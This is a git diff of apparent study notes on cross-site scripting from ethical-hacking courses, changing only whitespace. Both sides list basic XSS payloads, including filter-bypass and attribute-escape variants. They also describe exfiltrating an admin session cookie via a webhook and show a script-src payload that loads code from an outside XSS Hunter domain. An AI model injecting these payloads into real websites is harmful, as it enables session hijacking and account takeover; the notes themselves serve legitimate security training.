@@ -4,85 +4,85 @@ XSS
 Lessons on XSS
 --------------
 
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
-* "XSS - Introduction" - https://academy.tcm-sec.com/courses/1152300/lectures/47778441  
-- XSS makes use of JavaScript to run malicious actions in a target's web browser  
-- In order to understand the basics of JavaScript take 20-30 minutes and study it using this free interactive site: https://www.w3schools.com/js/  
-- Traditionally, the command `alert(1)` was used to check for XSS. Due to changes in Chrome it is better to use `print()` or `prompt("hello")`; see here: https://portswigger.net/research/alert-is-dead-long-live-print  
-* "XSS - DOM Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778510  
-- With DOM based XSS the vulnerability is on the client side (not the server side). This means that the vulnerability exists in the way the browser application installed on the user device interprets the JavaScript of the XSS vulnerable website in question. If you open the Network tab in the Developer Tools of the website, you will see that the input that is being posted is not going out to a server and coming back but rather staying on the local device. You can test this by entering an input; if when you enter an input nothing (no 200 or 400 messages; no GET or POST messages) appear in the Network tab, this means that everything is happening in the client.  
-* "XSS - Stored Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778529  
-- It is worthwhile to set up different "containers" in your browser so that you can check if XSS that was posted by one user is truly stored and available to another user who logs into the site. This is easily done in Firefox. The ability to set up containers in Firefox is a Mozilla FireFox Add-On that can be installed in the Firefox browser from here: https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/. The containers can then be managed (add containers, delete containers, rename containers), and they are separate identities so that two different users can be signed in to one website separately at the same time. They do not share cookies, etc. These containers make it easy to test for stored XSS and other kinds of vulnerabilities (such as whether there are insecure authorization issues [like the ability to update John's account with Jane's session token]).  
-- It is worth testing first for HTML injection because that is easier to accomplish; if HTML injection works then start playing around to find the syntax that might be needed to get XSS to work. HTML injection can be tested by entering:  
-<h1>test</h1>  
-in the input box  
-- When testing for XSS it can be useful to set up a webhook. This will allow your XSS command to exfiltrate data (e.g. an Admin session cookie that was harvested using an XSS payload) to a server for storage. In a real pentest you would send the data to a AWS EC2 server (or similar setup) that you control so that no one else could see it. For non-sensitive information it is easy to use this website: https://webhook.site/. When you go to it it will automatically create a webhook for you (note: that is public) and when you add that webhook to your payload and then the payload is run the data will appear on the webhook page that was just created.  
-* "XSS - Challenge Walkthrough" - https://academy.tcm-sec.com/courses/1152300/lectures/47778530  
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
+* "XSS - Introduction" - https://academy.tcm-sec.com/courses/1152300/lectures/47778441
+- XSS makes use of JavaScript to run malicious actions in a target's web browser
+- In order to understand the basics of JavaScript take 20-30 minutes and study it using this free interactive site: https://www.w3schools.com/js/
+- Traditionally, the command `alert(1)` was used to check for XSS. Due to changes in Chrome it is better to use `print()` or `prompt("hello")`; see here: https://portswigger.net/research/alert-is-dead-long-live-print
+* "XSS - DOM Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778510
+- With DOM based XSS the vulnerability is on the client side (not the server side). This means that the vulnerability exists in the way the browser application installed on the user device interprets the JavaScript of the XSS vulnerable website in question. If you open the Network tab in the Developer Tools of the website, you will see that the input that is being posted is not going out to a server and coming back but rather staying on the local device. You can test this by entering an input; if when you enter an input nothing (no 200 or 400 messages; no GET or POST messages) appear in the Network tab, this means that everything is happening in the client.
+* "XSS - Stored Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778529
+- It is worthwhile to set up different "containers" in your browser so that you can check if XSS that was posted by one user is truly stored and available to another user who logs into the site. This is easily done in Firefox. The ability to set up containers in Firefox is a Mozilla FireFox Add-On that can be installed in the Firefox browser from here: https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/. The containers can then be managed (add containers, delete containers, rename containers), and they are separate identities so that two different users can be signed in to one website separately at the same time. They do not share cookies, etc. These containers make it easy to test for stored XSS and other kinds of vulnerabilities (such as whether there are insecure authorization issues [like the ability to update John's account with Jane's session token]).
+- It is worth testing first for HTML injection because that is easier to accomplish; if HTML injection works then start playing around to find the syntax that might be needed to get XSS to work. HTML injection can be tested by entering:
+<h1>test</h1>
+in the input box
+- When testing for XSS it can be useful to set up a webhook. This will allow your XSS command to exfiltrate data (e.g. an Admin session cookie that was harvested using an XSS payload) to a server for storage. In a real pentest you would send the data to a AWS EC2 server (or similar setup) that you control so that no one else could see it. For non-sensitive information it is easy to use this website: https://webhook.site/. When you go to it it will automatically create a webhook for you (note: that is public) and when you add that webhook to your payload and then the payload is run the data will appear on the webhook page that was just created. 
+* "XSS - Challenge Walkthrough" - https://academy.tcm-sec.com/courses/1152300/lectures/47778530
 - This lecture shows how to use XSS with the webhook mentioned in the previous lecture to harvest an Admin session cookie.
 
 ---------------------------------------------------
 Some Basic XSS Payloads:
 
-* basic  
+* basic
 <script>alert('XSS');</script>
 
-* escape insert tab - ">  
+* escape insert tab - ">
 "><script>alert('XSS');</script>
 
-* escape text area - </textarea>  
+* escape text area - </textarea>
 </textarea><script>alert('XSS');</script>
 
-* escape JavaScript command - '; ____ //  
+* escape JavaScript command - '; ____ //
 ';alert('XSS');//
 
-* bypassing filter that filters out the word script - sscriptcript  
+* bypassing filter that filters out the word script - sscriptcript
 <sscriptcript>alert('XSS');</sscriptcript>
 
-* escape IMG tag - onload=  
+* escape IMG tag - onload=
 /NAME_OF_FOLDER/NAME_OF_FILE.jpg" onload="alert('XSS');
 
 [hat tip: TryHackMe - https://tryhackme.com/room/xssgi]
 ------------------------------------------------------
 
-Sites with more XSS payloads:  
-* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet  
-* https://github.com/payloadbox/xss-payload-list  
-* https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt  
-* http://www.xss-payloads.com/ [hat tip: TryHackMe]  
-* https://github.com/terjanq/Tiny-XSS-Payloads [hat tip: TryHackMe; helps to bypass restrictions on length]  
-* https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting  
-* https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss  
+Sites with more XSS payloads:
+* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+* https://github.com/payloadbox/xss-payload-list
+* https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
+* http://www.xss-payloads.com/ [hat tip: TryHackMe]
+* https://github.com/terjanq/Tiny-XSS-Payloads [hat tip: TryHackMe; helps to bypass restrictions on length]
+* https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+* https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss
 * https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html [hat tip: TryHackMe]
 
 
 ------------------------------------------------------
 Tips on XSS
 ------------
-* In order to prevent the website from running all the HTML code (found in the source code) that follows our XSS script injection, insert the "comment tag" at the end of the XSS injection:  
-<--  
+* In order to prevent the website from running all the HTML code (found in the source code) that follows our XSS script injection, insert the "comment tag" at the end of the XSS injection:
+<--
 [hat tip: Jonathan Erez]
 
-*  Make sure to try XSS injection in each input box - sometimes one wasn't sanitized even though the others were  
-*  Make sure to try XSS injection in URL input box; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL  
+*  Make sure to try XSS injection in each input box - sometimes one wasn't sanitized even though the others were
+*  Make sure to try XSS injection in URL input box; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL
 [hat tip: ThriveDX]
 
-* It is worth testing first for HTML injection because that is easier to accomplish; if HTML injection works then start playing around to find the syntax that might be needed to get XSS to work. HTML injection can be tested by entering:  
-<h1>test</h1>  
-in the input box  
+* It is worth testing first for HTML injection because that is easier to accomplish; if HTML injection works then start playing around to find the syntax that might be needed to get XSS to work. HTML injection can be tested by entering:
+<h1>test</h1>
+in the input box 
 [hat tip: https://academy.tcm-sec.com/courses/1152300/lectures/47778529]
 
 -----------------------------------------------------
 XSS Tools
 ---------
 
-* XSS Hunter  
-https://xsshunter.com/  
-XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.  
-Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.  
+* XSS Hunter
+https://xsshunter.com/
+XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
 [hat tip: TryHackMe]
 
 
-* XSS Automation Tool  
-https://github.com/EmperialX/XSS-Automation-Tool  
-"XSS automation tool helps hackers identify and exploit cross-site scripting vulnerabilities in web apps. Tests for reflected and persistent XSS. Customize request headers, cookies, proxies, and auth. Find and exploit vulnerabilities with our XSS automation tool."  
+* XSS Automation Tool
+https://github.com/EmperialX/XSS-Automation-Tool
+"XSS automation tool helps hackers identify and exploit cross-site scripting vulnerabilities in web apps. Tests for reflected and persistent XSS. Customize request headers, cookies, proxies, and auth. Find and exploit vulnerabilities with our XSS automation tool."
 [hat tip: Eli on Cyber Together 2 (WhatsApp)]
